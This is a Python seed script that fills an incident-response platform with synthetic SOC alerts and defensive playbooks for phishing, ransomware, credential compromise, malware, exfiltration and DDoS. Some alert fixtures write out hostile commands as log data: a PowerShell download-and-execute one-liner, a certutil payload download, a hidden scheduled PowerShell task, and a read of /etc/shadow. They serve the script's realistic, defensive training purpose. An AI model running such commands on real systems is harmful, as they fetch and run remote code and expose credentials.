"""Seed the IR platform with a realistic SOC dataset.

Creates analysts, ~30 alerts across multiple detection sources (EDR, SIEM,
IDS, email gateway, firewall, cloud), and several pre-built playbooks.

Run:  python seed.py
"""

import json
import random
from datetime import datetime, timedelta

from app import create_app
from models import db, User, Alert, Playbook


def utc_minus(**kwargs):
    return datetime.utcnow() - timedelta(**kwargs)


USERS = [
    ("amartinez", "Ana Martinez", "lead"),
    ("jchen", "Jamal Chen", "analyst"),
    ("rkapoor", "Riya Kapoor", "analyst"),
    ("tokafor", "Tunde Okafor", "analyst"),
    ("soliveira", "Sofia Oliveira", "manager"),
]


def make_alerts():
    """Realistic alerts modelled on what you'd see in a real SOC queue."""

    return [
        # ---- Brute force / credential attacks ----
        dict(
            timestamp=utc_minus(minutes=12),
            source="Splunk",
            event_type="authentication_failure_burst",
            severity="high",
            title="Brute-force against VPN account: 287 failures in 4 min",
            description=(
                "Cisco AnyConnect VPN reporting 287 failed logon attempts targeting "
                "user 'mthompson' from 45.227.255.206 (RU). Account is currently "
                "locked. No successful logon observed yet."
            ),
            raw_log=json.dumps({
                "src_ip": "45.227.255.206",
                "src_country": "RU",
                "user": "mthompson",
                "service": "vpn",
                "attempts": 287,
                "window_minutes": 4,
                "result": "locked_out"
            }, indent=2),
            src_ip="45.227.255.206",
            src_user="mthompson",
            mitre_tactic="TA0006 Credential Access",
            mitre_technique="T1110.001 Password Guessing",
        ),
        dict(
            timestamp=utc_minus(minutes=22),
            source="Okta",
            event_type="impossible_travel",
            severity="high",
            title="Impossible travel: jchen logged in from US then DE within 8m",
            description=(
                "User jchen authenticated successfully from 73.214.18.4 (Austin, US) "
                "at 14:02 UTC and from 185.220.101.45 (Berlin, DE — Tor exit) at "
                "14:10 UTC. Geographic distance not feasible in elapsed time."
            ),
            raw_log=json.dumps({
                "user": "jchen",
                "events": [
                    {"ip": "73.214.18.4", "city": "Austin", "country": "US", "ts": "14:02:11Z"},
                    {"ip": "185.220.101.45", "city": "Berlin", "country": "DE",
                     "ts": "14:10:47Z", "tor_exit": True}
                ]
            }, indent=2),
            src_ip="185.220.101.45",
            src_user="jchen",
            mitre_tactic="TA0001 Initial Access",
            mitre_technique="T1078 Valid Accounts",
        ),
        dict(
            timestamp=utc_minus(hours=1, minutes=5),
            source="Azure AD",
            event_type="legacy_auth_attempt",
            severity="medium",
            title="Legacy auth protocol used by service account svc-backup",
            description=(
                "Account svc-backup authenticated via IMAP/Basic auth from "
                "104.131.27.18. Legacy auth is disabled by policy for interactive "
                "users; verify whether this service account still requires it."
            ),
            raw_log=json.dumps({"user": "svc-backup", "protocol": "IMAP", "auth": "basic"}),
            src_ip="104.131.27.18",
            src_user="svc-backup",
            mitre_tactic="TA0001 Initial Access",
            mitre_technique="T1078.004 Cloud Accounts",
        ),

        # ---- Phishing / email ----
        dict(
            timestamp=utc_minus(minutes=44),
            source="Proofpoint",
            event_type="suspicious_attachment",
            severity="high",
            title="HTML smuggling attachment delivered to 14 mailboxes",
            description=(
                "Inbound message with subject 'DocuSign: Invoice INV-90412 ready' "
                "containing HTML attachment that decodes to a password-protected ZIP "
                "with an .iso payload. Delivered to 14 finance team mailboxes before "
                "policy update. Possible Qakbot/Pikabot delivery chain."
            ),
            raw_log=json.dumps({
                "sender": "billing@docusgn-secure.com",
                "subject": "DocuSign: Invoice INV-90412 ready",
                "attachment": "Invoice_INV-90412.html",
                "sha256": "9c3e7b2c4b3d4a8f1e5a6b9c0d2e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e",
                "recipients": 14,
                "delivered": True
            }, indent=2),
            mitre_tactic="TA0001 Initial Access",
            mitre_technique="T1566.001 Spearphishing Attachment",
        ),
        dict(
            timestamp=utc_minus(hours=2),
            source="Proofpoint",
            event_type="credential_phish",
            severity="medium",
            title="O365 credential phishing page hosted on look-alike domain",
            description=(
                "Email containing link to https://login-microsoftonline.support/auth — "
                "URL resolves to known phishing kit. Two users clicked; no MFA prompts "
                "have been observed for their accounts."
            ),
            raw_log=json.dumps({
                "url": "https://login-microsoftonline.support/auth",
                "kit": "EvilProxy",
                "clicked_by": ["agarcia", "lpark"]
            }, indent=2),
            mitre_tactic="TA0006 Credential Access",
            mitre_technique="T1566.002 Spearphishing Link",
        ),

        # ---- Endpoint / EDR ----
        dict(
            timestamp=utc_minus(minutes=8),
            source="CrowdStrike Falcon",
            event_type="suspicious_process_chain",
            severity="critical",
            title="Office spawning PowerShell with encoded payload on FIN-WS-014",
            description=(
                "WINWORD.EXE -> cmd.exe -> powershell.exe -EncodedCommand observed on "
                "FIN-WS-014 (user: kpatel). Decoded payload attempts to download from "
                "hxxp://194.165.16.77/agent.ps1. Falcon prevention blocked execution."
            ),
            raw_log=json.dumps({
                "host": "FIN-WS-014",
                "user": "kpatel",
                "process_tree": [
                    "WINWORD.EXE (PID 4812)",
                    "  cmd.exe /c powershell -enc <b64>",
                    "    powershell.exe -EncodedCommand JABjAD0A..."
                ],
                "decoded": "IEX (New-Object Net.WebClient).DownloadString('http://194.165.16.77/agent.ps1')",
                "verdict": "blocked",
                "sha256_winword": "d7e1f3b5...",
            }, indent=2),
            src_host="FIN-WS-014",
            src_user="kpatel",
            dst_ip="194.165.16.77",
            mitre_tactic="TA0002 Execution",
            mitre_technique="T1059.001 PowerShell",
        ),
        dict(
            timestamp=utc_minus(minutes=33),
            source="CrowdStrike Falcon",
            event_type="ransomware_canary",
            severity="critical",
            title="Mass file rename pattern on SRV-FS-02 — possible ransomware",
            description=(
                "1,842 files renamed to *.lockbit3 extension in 90 seconds on SRV-FS-02 "
                "share \\\\corp\\finance. Source process: explorer.exe spawned from "
                "rundll32.exe. Falcon containment auto-engaged."
            ),
            raw_log=json.dumps({
                "host": "SRV-FS-02",
                "share": "\\\\corp\\finance",
                "renamed_count": 1842,
                "new_extension": ".lockbit3",
                "containment": "auto-engaged"
            }, indent=2),
            src_host="SRV-FS-02",
            mitre_tactic="TA0040 Impact",
            mitre_technique="T1486 Data Encrypted for Impact",
        ),
        dict(
            timestamp=utc_minus(hours=1, minutes=40),
            source="Microsoft Defender",
            event_type="lolbin_abuse",
            severity="high",
            title="certutil.exe used to download executable on DEV-WS-22",
            description=(
                "certutil.exe -urlcache -split -f http://files.tinyurlhost.io/upd.exe "
                "C:\\Users\\Public\\upd.exe executed by user dho. Living-off-the-land "
                "binary commonly abused for staging."
            ),
            raw_log=json.dumps({
                "host": "DEV-WS-22",
                "user": "dho",
                "command": "certutil -urlcache -split -f http://files.tinyurlhost.io/upd.exe C:\\Users\\Public\\upd.exe"
            }, indent=2),
            src_host="DEV-WS-22",
            src_user="dho",
            mitre_tactic="TA0011 Command and Control",
            mitre_technique="T1105 Ingress Tool Transfer",
        ),
        dict(
            timestamp=utc_minus(hours=3),
            source="SentinelOne",
            event_type="credential_dumping",
            severity="critical",
            title="LSASS memory access by suspicious process on DC-01",
            description=(
                "Non-system process (taskhost64.exe, parent: services.exe with anomalous "
                "hash) opened LSASS handle with PROCESS_VM_READ on DC-01. Strong indicator "
                "of credential dumping (Mimikatz, ProcDump, comsvcs.dll)."
            ),
            raw_log=json.dumps({
                "host": "DC-01",
                "target": "lsass.exe",
                "access": "PROCESS_VM_READ | PROCESS_QUERY_INFORMATION",
                "actor_process": "taskhost64.exe",
                "actor_sha256": "e3a8c0b6..."
            }, indent=2),
            src_host="DC-01",
            mitre_tactic="TA0006 Credential Access",
            mitre_technique="T1003.001 LSASS Memory",
        ),

        # ---- Network / IDS ----
        dict(
            timestamp=utc_minus(minutes=15),
            source="Suricata",
            event_type="c2_beacon",
            severity="high",
            title="Periodic HTTPS beacon to known Cobalt Strike C2",
            description=(
                "Host 10.42.7.118 generating 60-second-interval HTTPS connections to "
                "194.165.16.77 (cs-beacon[.]xyz). JA3 fingerprint matches Cobalt Strike "
                "default profile. ~144 connections in last 2h."
            ),
            raw_log=json.dumps({
                "internal_ip": "10.42.7.118",
                "external_ip": "194.165.16.77",
                "domain": "cs-beacon.xyz",
                "ja3": "72a589da586844d7f0818ce684948eea",
                "interval_seconds": 60,
                "connections_2h": 144
            }, indent=2),
            src_ip="10.42.7.118",
            dst_ip="194.165.16.77",
            mitre_tactic="TA0011 Command and Control",
            mitre_technique="T1071.001 Web Protocols",
        ),
        dict(
            timestamp=utc_minus(minutes=50),
            source="Zeek",
            event_type="dns_exfiltration",
            severity="high",
            title="High-volume TXT queries to dyn-data.exfil-tunnel.net",
            description=(
                "Internal host 10.42.5.66 issued 4,712 DNS TXT queries to subdomains "
                "of dyn-data.exfil-tunnel.net in 30 minutes. Average query length 198 "
                "bytes — consistent with DNS tunneling."
            ),
            raw_log=json.dumps({
                "internal_ip": "10.42.5.66",
                "domain": "dyn-data.exfil-tunnel.net",
                "query_count": 4712,
                "avg_query_len": 198,
                "type": "TXT"
            }, indent=2),
            src_ip="10.42.5.66",
            mitre_tactic="TA0010 Exfiltration",
            mitre_technique="T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol",
        ),
        dict(
            timestamp=utc_minus(hours=4),
            source="Palo Alto NGFW",
            event_type="port_scan",
            severity="low",
            title="Internal port scan: 10.42.9.21 → /24 across 20+ ports",
            description=(
                "Workstation 10.42.9.21 (user: jchen) scanned 10.42.9.0/24 on TCP "
                "ports 22, 80, 135, 139, 443, 445, 3389 and others. Could be IT "
                "diagnostic tool or reconnaissance."
            ),
            raw_log=json.dumps({
                "scanner": "10.42.9.21",
                "target_range": "10.42.9.0/24",
                "ports": [22, 80, 135, 139, 443, 445, 3389, 5985, 8080]
            }, indent=2),
            src_ip="10.42.9.21",
            src_user="jchen",
            mitre_tactic="TA0007 Discovery",
            mitre_technique="T1046 Network Service Discovery",
        ),

        # ---- Cloud / SaaS ----
        dict(
            timestamp=utc_minus(hours=2, minutes=20),
            source="AWS GuardDuty",
            event_type="iam_anomalous_api",
            severity="high",
            title="Root account API call from unusual ASN (UNAUTHORIZED_ACCESS:IAMUser/ConsoleLoginSuccess.B)",
            description=(
                "Root user successfully signed into the AWS console from 89.248.165.34 "
                "(ASN 202425 — IP Volume Inc, NL). Root login is policy-prohibited."
            ),
            raw_log=json.dumps({
                "account": "1234-5678-9012",
                "principal": "root",
                "src_ip": "89.248.165.34",
                "asn": "202425",
                "asn_org": "IP Volume Inc",
                "country": "NL",
                "finding": "UNAUTHORIZED_ACCESS:IAMUser/ConsoleLoginSuccess.B"
            }, indent=2),
            src_ip="89.248.165.34",
            src_user="root",
            mitre_tactic="TA0001 Initial Access",
            mitre_technique="T1078.004 Cloud Accounts",
        ),
        dict(
            timestamp=utc_minus(hours=5),
            source="AWS CloudTrail",
            event_type="s3_public_acl",
            severity="medium",
            title="S3 bucket made public: corp-finance-archive",
            description=(
                "PutBucketAcl call set 'AllUsers' READ on bucket corp-finance-archive "
                "by IAM user contractor-fbenitez. Bucket contains 4.2 TB of financial "
                "data."
            ),
            raw_log=json.dumps({
                "event": "PutBucketAcl",
                "user": "contractor-fbenitez",
                "bucket": "corp-finance-archive",
                "grant": "AllUsers:READ"
            }, indent=2),
            src_user="contractor-fbenitez",
            mitre_tactic="TA0010 Exfiltration",
            mitre_technique="T1530 Data from Cloud Storage Object",
        ),
        dict(
            timestamp=utc_minus(hours=6),
            source="GitHub",
            event_type="secret_leak",
            severity="high",
            title="AWS access key pushed to public repo employee/side-project",
            description=(
                "GitHub secret scanning flagged an AWS_SECRET_ACCESS_KEY in commit "
                "8e3a7c1 of public repo employee/side-project. Key prefix AKIAYV...,"
                " maps to IAM user ci-deploy-prod."
            ),
            raw_log=json.dumps({
                "repo": "employee/side-project",
                "commit": "8e3a7c1",
                "secret_type": "AWS_SECRET_ACCESS_KEY",
                "key_id": "AKIAYV3XK2Q7H4N9LM2P"
            }, indent=2),
            mitre_tactic="TA0006 Credential Access",
            mitre_technique="T1552.001 Credentials In Files",
        ),

        # ---- Insider / DLP ----
        dict(
            timestamp=utc_minus(hours=7),
            source="Symantec DLP",
            event_type="exfil_usb",
            severity="medium",
            title="312 customer records copied to USB by user lpark",
            description=(
                "User lpark copied 312 records (PII: name + SSN + DOB) from CRM export "
                "to removable drive (VID:0951 PID:1666). User is on a PIP and submitted "
                "resignation last week."
            ),
            raw_log=json.dumps({
                "user": "lpark",
                "host": "SALES-WS-09",
                "removable_device": "USB:0951:1666",
                "files_copied": 4,
                "records": 312,
                "data_classifiers": ["PII:SSN", "PII:DOB"]
            }, indent=2),
            src_host="SALES-WS-09",
            src_user="lpark",
            mitre_tactic="TA0010 Exfiltration",
            mitre_technique="T1052.001 Exfiltration over USB",
        ),
        dict(
            timestamp=utc_minus(hours=8),
            source="Microsoft Purview",
            event_type="mass_download",
            severity="medium",
            title="SharePoint: 1.8 GB downloaded in 7 minutes by external guest",
            description=(
                "External guest account 'jdoe_consult@gmail.com' downloaded 247 files "
                "(1.8 GB) from 'Project Aurora' SharePoint site. Guest invited 11 "
                "months ago for a 2-week scope of work."
            ),
            raw_log=json.dumps({
                "user": "jdoe_consult@gmail.com",
                "site": "Project Aurora",
                "files": 247,
                "bytes": 1879048192
            }, indent=2),
            src_user="jdoe_consult@gmail.com",
            mitre_tactic="TA0009 Collection",
            mitre_technique="T1213 Data from Information Repositories",
        ),

        # ---- Web ----
        dict(
            timestamp=utc_minus(hours=2, minutes=50),
            source="AWS WAF",
            event_type="sqli_pattern",
            severity="medium",
            title="SQL injection attempts on /api/v1/login from single IP",
            description=(
                "AWS WAF blocked 423 requests in 9 minutes matching SQLi signatures "
                "targeting /api/v1/login from 162.247.74.213 (Tor exit). Patterns "
                "include UNION SELECT, sleep(), and boolean-based blind probes."
            ),
            raw_log=json.dumps({
                "src_ip": "162.247.74.213",
                "blocked_requests": 423,
                "endpoint": "/api/v1/login",
                "rule": "SQLi_BODY"
            }, indent=2),
            src_ip="162.247.74.213",
            mitre_tactic="TA0001 Initial Access",
            mitre_technique="T1190 Exploit Public-Facing Application",
        ),
        dict(
            timestamp=utc_minus(hours=11),
            source="Cloudflare",
            event_type="ddos",
            severity="high",
            title="L7 DDoS: 480k req/s targeting checkout API",
            description=(
                "Anti-DDoS triggered on POST /api/checkout — peak 480k req/s for 12 "
                "minutes, distributed across 14,200 source IPs (botnet pattern). "
                "Service degraded but did not fail over."
            ),
            raw_log=json.dumps({
                "endpoint": "POST /api/checkout",
                "peak_rps": 480000,
                "duration_min": 12,
                "unique_src_ips": 14200,
            }, indent=2),
            mitre_tactic="TA0040 Impact",
            mitre_technique="T1498 Network Denial of Service",
        ),

        # ---- Misc / lower priority ----
        dict(
            timestamp=utc_minus(minutes=2),
            source="Splunk",
            event_type="failed_login",
            severity="low",
            title="3 failed SSH logins on bastion-01 (existing user)",
            description="User 'amartinez' had 3 failed SSH password attempts before successful key-based auth.",
            raw_log="Mar 14 14:12:01 bastion-01 sshd[2123]: Failed password for amartinez from 73.214.18.4",
            src_ip="73.214.18.4",
            src_user="amartinez",
            src_host="bastion-01",
            mitre_tactic="TA0006 Credential Access",
            mitre_technique="T1110 Brute Force",
        ),
        dict(
            timestamp=utc_minus(minutes=18),
            source="Microsoft Defender",
            event_type="eicar_test",
            severity="info",
            title="EICAR test file detected on training VM TRAIN-WS-04",
            description="EICAR test file dropped in C:\\Users\\trainer\\Desktop\\eicar.txt — likely a training exercise.",
            raw_log="EICAR-Test-File found at C:\\Users\\trainer\\Desktop\\eicar.txt",
            src_host="TRAIN-WS-04",
            src_user="trainer",
        ),
        dict(
            timestamp=utc_minus(hours=9),
            source="Tenable",
            event_type="vuln_scan",
            severity="medium",
            title="Critical CVE-2024-21887 detected on Ivanti-VPN-02",
            description="Ivanti Connect Secure 22.4R2.2 on Ivanti-VPN-02 affected by CVE-2024-21887 (command injection, CVSS 9.1). Public exploit available.",
            raw_log=json.dumps({
                "host": "Ivanti-VPN-02",
                "product": "Ivanti Connect Secure",
                "version": "22.4R2.2",
                "cve": "CVE-2024-21887",
                "cvss": 9.1
            }, indent=2),
            src_host="Ivanti-VPN-02",
        ),
        dict(
            timestamp=utc_minus(hours=13),
            source="Auditd",
            event_type="sudo_violation",
            severity="medium",
            title="User dho attempted sudo from non-sudoers group 14 times",
            description="14 unauthorized sudo attempts on prod-app-07 by user 'dho' (commands: cat /etc/shadow, useradd, vi /etc/sudoers).",
            raw_log="sudo: dho : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/dho ; USER=root ; COMMAND=/bin/cat /etc/shadow",
            src_host="prod-app-07",
            src_user="dho",
            mitre_tactic="TA0004 Privilege Escalation",
            mitre_technique="T1548.003 Sudo and Sudo Caching",
        ),
        dict(
            timestamp=utc_minus(hours=15),
            source="Azure AD",
            event_type="oauth_consent",
            severity="medium",
            title="Risky OAuth consent: 'CloudDocSync' requested Mail.ReadWrite for 6 users",
            description=(
                "Third-party OAuth app 'CloudDocSync' (Publisher unverified) granted "
                "Mail.ReadWrite, Files.Read.All, offline_access by 6 users between "
                "08:14 and 09:02 UTC. Pattern matches illicit consent grant attack."
            ),
            raw_log=json.dumps({
                "app": "CloudDocSync",
                "publisher_verified": False,
                "scopes": ["Mail.ReadWrite", "Files.Read.All", "offline_access"],
                "consenting_users": 6
            }, indent=2),
            mitre_tactic="TA0006 Credential Access",
            mitre_technique="T1528 Steal Application Access Token",
        ),
        dict(
            timestamp=utc_minus(hours=10),
            source="CrowdStrike Falcon",
            event_type="suspicious_scheduled_task",
            severity="medium",
            title="Scheduled task created to run hidden PowerShell daily at 03:14",
            description=(
                "schtasks /create /tn 'Microsoft\\Windows\\WindowsUpdate\\Sync' "
                "/tr 'powershell -w hidden -ep bypass -f C:\\ProgramData\\sync.ps1' "
                "/sc daily /st 03:14 on HR-WS-08."
            ),
            raw_log=json.dumps({
                "host": "HR-WS-08",
                "task_name": "Microsoft\\Windows\\WindowsUpdate\\Sync",
                "command": "powershell -w hidden -ep bypass -f C:\\ProgramData\\sync.ps1",
                "trigger": "daily 03:14"
            }, indent=2),
            src_host="HR-WS-08",
            mitre_tactic="TA0003 Persistence",
            mitre_technique="T1053.005 Scheduled Task",
        ),
        dict(
            timestamp=utc_minus(minutes=4),
            source="Wazuh",
            event_type="ssh_new_country",
            severity="medium",
            title="SSH login from new country (KP) for service account svc-deploy",
            description="First-ever observed source country (KP) for svc-deploy SSH login on jump-04. Source IP 175.45.176.18.",
            raw_log="Accepted publickey for svc-deploy from 175.45.176.18 port 51234 ssh2: ED25519 SHA256:...",
            src_ip="175.45.176.18",
            src_user="svc-deploy",
            src_host="jump-04",
            mitre_tactic="TA0001 Initial Access",
            mitre_technique="T1078 Valid Accounts",
        ),
        dict(
            timestamp=utc_minus(hours=20),
            source="Splunk",
            event_type="account_disabled_bypass",
            severity="high",
            title="Disabled account 'gford' attempted Kerberos TGT request",
            description="Disabled AD account 'gford' (terminated employee) attempted Kerberos pre-auth from 10.42.4.55. Account remains disabled but credential material may still be in use.",
            raw_log=json.dumps({"user": "gford", "src_ip": "10.42.4.55", "event_id": "4768"}),
            src_ip="10.42.4.55",
            src_user="gford",
            mitre_tactic="TA0006 Credential Access",
            mitre_technique="T1078.002 Domain Accounts",
        ),
    ]


PLAYBOOKS = [
    dict(
        name="Phishing Response",
        category="phishing",
        description=(
            "Standard procedure for responding to a confirmed or suspected phishing "
            "email reaching user inboxes. Based on NIST SP 800-61r2 and SANS IR steps."
        ),
        steps="\n".join([
            "1. Triage — confirm sender, subject, attachment hashes, embedded URLs.",
            "2. Identify scope — search mail logs for the same sender/subject/hash across all mailboxes.",
            "3. Identify clickers — pull proxy/EDR logs for any user who clicked the URL or opened the attachment.",
            "4. Contain — remove the message from all mailboxes (M365 Search-and-Purge or equivalent).",
            "5. Block sender domain, URL, attachment hash at email gateway, proxy, and EDR.",
            "6. For clickers: force password reset, revoke active sessions, require MFA re-enrollment.",
            "7. If credentials were entered: audit account activity for the previous 7 days; check for new mail rules, OAuth consents, MFA changes.",
            "8. Notify affected users with clear, blame-free guidance and report submission via the phishing button.",
            "9. Document: IOCs (sender, URLs, hashes), impacted users, actions taken, timeline.",
            "10. Lessons learned — update email rules, awareness training scenarios, detection logic.",
        ]),
    ),
    dict(
        name="Ransomware Containment",
        category="ransomware",
        description=(
            "Aggressive containment-first procedure when ransomware activity is "
            "suspected. Goal is to limit blast radius before deep forensic analysis."
        ),
        steps="\n".join([
            "1. DECLARE: open a P1 incident, notify on-call IR lead and CISO immediately. Open a war room (bridge + chat channel).",
            "2. ISOLATE: network-isolate the suspected host(s) via EDR containment or NAC. Do NOT power off (preserves memory and ransomware notes).",
            "3. PRESERVE: capture volatile data — memory image, running processes, network connections, logged-in users.",
            "4. IDENTIFY VARIANT: collect a sample of the ransomware binary or note file; check against ID-Ransomware / NoMoreRansom for known decryptors.",
            "5. SCOPE: query EDR/SIEM for the same hash, parent process, scheduled tasks, persistence mechanisms across the fleet.",
            "6. PROTECT BACKUPS: verify backup systems are isolated from compromised credentials; pause replication of corrupted data.",
            "7. CREDENTIALS: reset privileged credentials (domain admin, service accounts) and rotate KRBTGT twice if AD is involved.",
            "8. COMMUNICATE: brief legal, executive leadership, comms — do not engage threat actor without legal counsel.",
            "9. RESTORE: rebuild from clean known-good backups. Validate before re-introducing to the network.",
            "10. POST-INCIDENT: root cause analysis, gap remediation, regulator notifications if data exfil suspected (most groups exfiltrate before encrypting).",
        ]),
    ),
    dict(
        name="Compromised Credentials",
        category="credential_compromise",
        description="Response to a confirmed or suspected compromise of user credentials (cloud, SaaS, or domain).",
        steps="\n".join([
            "1. Disable / revoke — disable the account or, for service accounts, rotate the secret. Revoke all active sessions/tokens (Azure AD: Revoke-AzureADUserAllRefreshToken).",
            "2. Reset password — force a password change at next sign-in once disabled-status is lifted.",
            "3. Reset MFA — remove and require re-enrollment of all MFA factors (attackers commonly enroll their own).",
            "4. Audit recent activity — sign-in logs (geo, device, app), mailbox rules, OAuth consent grants, password changes, MFA changes, group memberships.",
            "5. Check for persistence — new app passwords, alternate emails, recovery phone numbers, forwarding rules.",
            "6. Hunt across identity — same source IP/UA/device against other accounts; lateral access via shared service accounts.",
            "7. If admin/service account — rotate any credentials the account had access to. Audit downstream changes the account made.",
            "8. Notify the user out-of-band (call, in-person) — do not use the compromised channel.",
            "9. Document IOCs and indicators of attacker infrastructure.",
        ]),
    ),
    dict(
        name="Malware on Endpoint",
        category="malware",
        description="Response when EDR or AV flags malicious activity on an endpoint.",
        steps="\n".join([
            "1. Verify — is it a true positive? Check hash on VirusTotal, look at process tree, command-line, network connections.",
            "2. Contain — isolate the host via EDR (do not power off). Notify the user.",
            "3. Triage — collect indicators: file hashes, registry keys, scheduled tasks, services, parent process, C2 IPs/domains, user account in context.",
            "4. Hunt — search the fleet for the same IOCs (other infected hosts, lateral spread).",
            "5. Determine entry vector — phishing email, drive-by, USB, RDP, exploited service. Pivot to that vector's playbook if needed.",
            "6. Eradicate — remove the malware artifacts (files, persistence, accounts created). For confirmed compromise, reimage rather than clean.",
            "7. Recover — restore the host from clean image; validate, return to production.",
            "8. Block IOCs at firewall, proxy, EDR, email gateway.",
            "9. Post-incident — update detections, share IOCs with peers/ISACs if appropriate.",
        ]),
    ),
    dict(
        name="Data Exfiltration",
        category="data_exfiltration",
        description="Suspected or confirmed unauthorized data movement (DLP hit, anomalous download volume, DNS tunneling, etc).",
        steps="\n".join([
            "1. Identify what — data classification (PII, PHI, source code, financials), volume, sensitivity.",
            "2. Identify who — user, host, account type (employee, contractor, service, external).",
            "3. Identify how — channel (USB, email, cloud sync, web upload, DNS tunnel, RDP file transfer).",
            "4. Identify where — destination IP/domain/service. WHOIS, reputation, ASN.",
            "5. Contain channel — block at firewall/proxy/EGW or disable the user's access to the channel.",
            "6. Preserve evidence — endpoint logs, network captures, mailbox journal, cloud audit logs. Chain of custody if HR/legal involved.",
            "7. Engage HR / Legal — for insider scenarios, do NOT alert the subject. Coordinate next steps with HR before user-facing actions.",
            "8. Quantify — exact records exfiltrated, regulatory implications (GDPR, HIPAA, PCI, state breach laws).",
            "9. Notify — internal stakeholders, and if required, customers/regulators within statutory timeframes.",
            "10. Lessons — DLP rule gaps, channel controls, monitoring blind spots.",
        ]),
    ),
    dict(
        name="DDoS Mitigation",
        category="denial_of_service",
        description="Volumetric or application-layer DoS against public-facing services.",
        steps="\n".join([
            "1. Confirm — distinguish DDoS from a genuine traffic spike (marketing event, viral content).",
            "2. Characterize — volumetric (Gbps), protocol (SYN, UDP, DNS amp), or application-layer (slow loris, HTTP flood). Identify target endpoint.",
            "3. Engage upstream — turn on or escalate Cloudflare/Akamai/AWS Shield mitigation. Contact ISP/scrubbing service if applicable.",
            "4. Rate-limit and challenge — JS/CAPTCHA challenges on the targeted endpoint; geo-blocks if traffic is geographically anomalous.",
            "5. Cache / static-fallback — serve cached or static error page to absorb load and protect origin.",
            "6. Communicate — status page, internal stakeholders, customer support, executive comms.",
            "7. Monitor for cover — DDoS is often a diversion. Watch for related intrusion attempts during the event.",
            "8. Post-event — capture metrics (peak rps, duration, mitigation cost), update runbooks, consider always-on protection.",
        ]),
    ),
]


def seed():
    app = create_app()
    with app.app_context():
        db.drop_all()
        db.create_all()

        # users
        users = []
        for username, display_name, role in USERS:
            u = User(username=username, display_name=display_name, role=role)
            db.session.add(u)
            users.append(u)
        db.session.flush()

        # alerts — randomly assign a few to analysts
        analysts = [u for u in users if u.role in ("analyst", "lead")]
        for data in make_alerts():
            a = Alert(**data)
            if random.random() < 0.35:
                a.assigned_to_id = random.choice(analysts).id
                a.status = "acknowledged"
            db.session.add(a)

        # playbooks
        for pb in PLAYBOOKS:
            db.session.add(Playbook(**pb))

        db.session.commit()
        print(f"Seeded {len(USERS)} users, {len(make_alerts())} alerts, {len(PLAYBOOKS)} playbooks.")
        print("Default analyst on login: amartinez (Ana Martinez, IR lead).")


if __name__ == "__main__":
    seed()
